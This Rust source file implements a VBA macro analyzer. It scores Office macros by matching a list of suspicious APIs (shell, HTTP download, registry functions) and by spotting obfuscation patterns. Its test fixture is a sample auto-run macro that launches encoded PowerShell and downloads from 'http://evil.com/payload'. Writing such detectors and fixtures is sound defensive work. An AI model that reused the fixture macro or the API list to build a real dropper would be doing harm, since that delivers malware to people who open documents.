//! UCOP-X VBA Analysis
//!
//! Analyzes VBA macros from Office documents: malicious macro detection,
//! deobfuscation, API call extraction, and behavioral analysis.

#![forbid(unsafe_code)]

use std::collections::HashMap;
use serde::{Serialize, Deserialize};

/// VBA macro analysis result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VbaAnalysisResult {
    pub macro_count: usize,
    pub module_names: Vec<String>,
    pub suspicious_apis: Vec<String>,
    pub obfuscation_indicators: Vec<String>,
    pub urls: Vec<String>,
    pub file_paths: Vec<String>,
    pub malicious_score: f64,
    pub is_malicious: bool,
}

/// VBA API call descriptor.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VbaApiCall {
    pub function: String,
    pub library: Option<String>,
    pub arguments: Vec<String>,
    pub line: usize,
}

/// Known suspicious VBA API functions.
const SUSPICIOUS_API: &[&str] = &[
    "CreateObject", "GetObject", "Shell", "Exec", "Run",
    "WScript.Shell", "Shell.Application", "WinHttp.WinHttpRequest",
    "Microsoft.XMLHTTP", "MSXML2.XMLHTTP", "ADODB.Stream",
    "URLDownloadToFile", "InternetOpenUrl", "WinHttpRequest",
    "FileSystemObject", "Scripting.FileSystemObject",
    "OpenTextFile", "CreateTextFile", "WriteLine",
    "Base64Decode", "Base64DecodeString",
    "RegRead", "RegWrite", "RegDelete",
    "CallByName", "Eval", "Execute",
    "DoEvents", "Sleep",
];

/// VBA macro analyzer.
#[derive(Debug)]
pub struct VbaAnalyzer;

impl VbaAnalyzer {
    /// Analyze VBA source code.
    pub fn analyze_source(source: &str) -> VbaAnalysisResult {
        let mut suspicious_apis = Vec::new();
        let mut obfuscation_indicators = Vec::new();
        let mut urls = Vec::new();
        let mut file_paths = Vec::new();
        let modules: Vec<&str> = source.split("Attribute VB_Name").collect();
        let module_names: Vec<String> = modules
            .iter()
            .skip(1)
            .filter_map(|m| {
                let line = m.lines().next()?;
                Some(line.trim().to_string())
            })
            .collect();

        // Check for suspicious API calls
        for api in SUSPICIOUS_API {
            if source.contains(api) {
                suspicious_apis.push(api.to_string());
            }
        }

        // Check for obfuscation patterns
        if source.contains("Chr(") && source.matches("Chr(").count() > 10 {
            obfuscation_indicators.push("Heavy Chr() encoding".into());
        }
        if source.contains("Split(") && source.contains("Join(") {
            obfuscation_indicators.push("Split/Join string obfuscation".into());
        }
        if source.contains("StrReverse") {
            obfuscation_indicators.push("StrReverse string reversal".into());
        }

        // Extract URLs
        let url_re = regex::Regex::new(r#"https?://[^\s"',;)]+"#).ok();
        if let Some(re) = url_re {
            for cap in re.captures_iter(source) {
                urls.push(cap[0].to_string());
            }
        }

        // Extract file paths
        let path_re = regex::Regex::new(r#"[cC]:\\[^\s"',;)]+"#).ok();
        if let Some(re) = path_re {
            for cap in re.captures_iter(source) {
                file_paths.push(cap[0].to_string());
            }
        }

        let malicious_score = if suspicious_apis.len() > 3 { 0.8 } else if suspicious_apis.len() > 1 { 0.4 } else { 0.0 };

        VbaAnalysisResult {
            macro_count: module_names.len(),
            module_names,
            suspicious_apis,
            obfuscation_indicators,
            urls,
            file_paths,
            malicious_score,
            is_malicious: malicious_score >= 0.7,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_benign_macro() {
        let source = r#"
            Sub Hello()
                MsgBox "Hello World"
            End Sub
        "#;
        let result = VbaAnalyzer::analyze_source(source);
        assert!(!result.is_malicious);
        assert_eq!(result.suspicious_apis.len(), 0);
    }

    #[test]
    fn test_malicious_macro() {
        let source = r#"
            Sub AutoOpen()
                Dim obj As Object
                Set obj = CreateObject("WScript.Shell")
                obj.Run "powershell -enc aABsACAAMgA"
                Dim http As Object
                Set http = CreateObject("WinHttp.WinHttpRequest")
                http.Open "GET", "http://evil.com/payload", False
                http.Send
            End Sub
        "#;
        let result = VbaAnalyzer::analyze_source(source);
        assert!(result.is_malicious);
        assert!(result.suspicious_apis.contains(&"CreateObject".to_string()));
        assert!(result.suspicious_apis.contains(&"WScript.Shell".to_string()));
    }
}
